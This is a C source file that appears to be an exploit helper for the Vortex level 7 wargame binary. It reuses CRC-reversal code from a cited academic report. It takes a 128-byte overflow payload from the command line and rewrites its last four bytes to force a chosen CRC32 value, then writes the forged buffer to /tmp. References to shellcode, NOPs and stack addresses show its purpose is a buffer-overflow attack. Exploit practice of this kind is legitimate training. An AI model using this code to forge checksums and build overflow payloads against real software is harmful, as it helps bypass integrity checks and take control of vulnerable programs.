/*
 * Taken from:
 *
 * Reversing CRC - Theory and Practice.
 * HU Berlin Public Report
 * SAR-PR-2006-05
 *
 * Authors:
 *  Martin Stigge
 *  Henryk Ploetz
 *  Wolf Mueller
 *  Jens-Peter Redlich
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
//#include "crc32_table.h"
//#include "../shellcode/shellcode.h"
//#include "../utils/get_esp.h"

#define	VULN_BIN	"/vortex/vortex7"

#define	DYNAMIC_CRC32_TABLE

#define CRCPOLY		0xEDB88320
#define CRCINV		0x5B358FD3 // inverse poly of (x^N) mod CRCPOLY
//#define INITXOR	0xFFFFFFFF
#define INITXOR		0x00000000
//#define FINALXOR	0xFFFFFFFF
#define FINALXOR	0x00000000
#define FIXCRC		0xe1ca95ee

#define BUFFER_SIZE	128
#define	PAYLOAD_SIZE	2048
#define DEFAULT_ALIGN	0
#define DEFAULT_OFFSET	0
#define NOP		0x90

typedef unsigned int uint32;

extern char** environ;

/**
 * Creates the CRC table with 256 32-bit entries. CAUTION: Assumes that
 * enough space for the resulting table has already been allocated.
 */
void make_crc_table(uint32 *table) {
    uint32 c;
    int n, k;

    for (n = 0; n < 256; n++) {
        c = n;
        for (k = 0; k < 8; k++) {
            if ((c & 1) != 0) {
                c = CRCPOLY ^ (c >> 1);
            } else {
                c = c >> 1;
            }
        }
        table[n] = c;
    }
}

///**
// * Computes the CRC32 of the buffer of the given length
// * using the supplied crc_table.
// */
//int crc32_tabledriven(unsigned char *buffer, int length, uint32 *crc_table) {
//    int i;
//    uint32 crcreg = INITXOR;
//
//    for (i = 0; i < length; ++i) {
//        crcreg = (crcreg >> 8) ^ crc_table[((crcreg ^ buffer[i]) & 0xFF)];
//    }
//
//    return crcreg ^ FINALXOR;
//}

/**
 * Changes the last 4 bytes of the given buffer so that it afterwards will
 * compute to the given tcrcreg using the given crc_table
 *
 * This function uses the method of the multiplication with (x^N)^-1.
 */
void fix_crc_end(unsigned char *buffer, int length, uint32 tcrcreg, uint32 *crc_table) {
    int i;
    tcrcreg ^= FINALXOR;

    // calculate crc except for the last 4 bytes; this is essentially crc32()
    uint32 crcreg = INITXOR;
    for (i = 0; i < length - 4; ++i) {
        crcreg = (crcreg >> 8) ^ crc_table[((crcreg ^ buffer[i]) & 0xFF)];
    }

    // calculate new content bits
    // new_content = tcrcreg * CRCINV mod CRCPOLY
    uint32 new_content = 0;
    for (i = 0; i < 32; ++i) {
        // reduce modulo CRCPOLY
        if (new_content & 1) {
            new_content = (new_content >> 1) ^ CRCPOLY;
        } else {
            new_content >>= 1;
        }
        // add CRCINV if corresponding bit of operand is set
        if (tcrcreg & 1) {
            new_content ^= CRCINV;
        }
        tcrcreg >>= 1;
    }
    // finally add old crc
    new_content ^= crcreg;

    // inject new content
    for (i = 0; i < 4; ++i) {
        buffer[length - 4 + i] = (new_content >> i*8) & 0xFF;
    }

}

/**
 * Initializes the CRC32 table.
 */
uint32* init_crc_table() {
#ifdef DYNAMIC_CRC32_TABLE
    // generate CRC32 table
    uint32* crc_table_dynamic = malloc(256*sizeof(uint32));
    make_crc_table(crc_table_dynamic);
    return crc_table_dynamic;
#else
    return crc_table_static;
#endif
}

/**
 * Generates the overflow buffer, contains repeated sequence with
 * the target address.
 */
char* make_buffer (char* payload) {
    int payload_len = strlen(payload);
    if(payload_len != 128){
        printf("len must be 128\n");
        exit(1);
    }
    char* buffer = malloc(BUFFER_SIZE);
    memcpy(buffer,payload, strlen(payload)+1);
    buffer[BUFFER_SIZE - 1] = '\0';
    return buffer + (0 % 4);
}


int main(int argc, char* argv[]) {
    // create and adjust overflow buffer
//    int offset = DEFAULT_OFFSET;
//    int align = DEFAULT_ALIGN;
//    if (argc > 1) offset = atoi(argv[1]);
//    if (argc > 2) align = atoi(argv[2]);

    // copy payload on heap
    char* buffer = make_buffer(argv[1]);
    uint32* crc_table = init_crc_table();
    fix_crc_end(buffer, BUFFER_SIZE, FIXCRC, crc_table);
    FILE *fp;

    fp = fopen("/tmp/docgil", "w+");
    fputs(buffer, fp);
    fclose(fp);
    return 0;

}


